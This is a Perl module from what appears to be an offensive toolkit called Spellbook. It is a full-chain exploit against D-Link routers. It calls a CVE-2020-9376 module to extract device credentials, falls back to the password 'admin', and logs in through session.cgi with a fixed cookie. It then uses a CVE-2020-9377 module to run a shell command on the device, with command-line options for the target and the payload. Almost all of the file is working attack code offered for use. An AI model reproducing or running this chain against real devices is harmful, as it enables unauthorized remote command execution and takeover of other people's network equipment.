package Spellbook::Exploit::Fullchain_DLINK {
    use strict;
    use warnings;
    use HTTP::Request;
    use HTTP::Headers;
    use LWP::UserAgent;
    use Spellbook::Recon::Query_Shodan;
    use Spellbook::Advisory::CVE_2020_9376;
    use Spellbook::Advisory::CVE_2020_9377;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $payload, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"      => \$help,
            "t|target=s"  => \$target,
            "p|payload=s" => \$payload
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) {
                $target = "http://$target";
            }

            my $credentials = Spellbook::Advisory::CVE_2020_9376 -> new (["--target" => $target]);

            if ($credentials) {
                my ($username, $password) = split /:/, $credentials;

                if (!$password) { 
                    $password = "admin";
                }

                if ($username) {
                    my $userAgent = LWP::UserAgent->new();
                    my $payload   = "REPORT_METHOD=xml&ACTION=login_plaintext&USER=$username&PASSWD=$password&CAPTCHA=";
                        
                    my $headers   = HTTP::Headers->new (
                        "Content-Type" => "application/x-www-form-urlencoded",
                        "Cookie" => "uid=zwUEueUOvi",
                        "User-Agent" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",                            "Accept" => "*/*",
                        "Accept-Language" => "en-US,en;q=0.5",
                        "Accept-Encoding" => "gzip, deflate",
                        "Origin" => $target,
                        "Referer" => $target,
                        "Connection" => "keep-alive"
                    );

                    my $request   = HTTP::Request -> new("POST", "$target/session.cgi", $headers, $payload);
                    my $response  = $userAgent -> request($request);
                        
                    if ($response -> is_success) {   
                        my @exploit = Spellbook::Advisory::CVE_2020_9377 -> new ([
                            "--target" => $target,
                            "--cookie" => "zwUEueUOvi",
                            "--payload" => "uname -a"
                        ]);
                            
                        if ($exploit[0] ne "Authenication fail") {
                            push @results, @exploit;
                        }
                    }
                }
            }

            return @results;
        }

        if ($help) {
            return "
                \rExploit::Fullchain_DLINK
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target
                \r-p, --payload  Send a command\n\n";
        }

        return 0;
    }
}

1;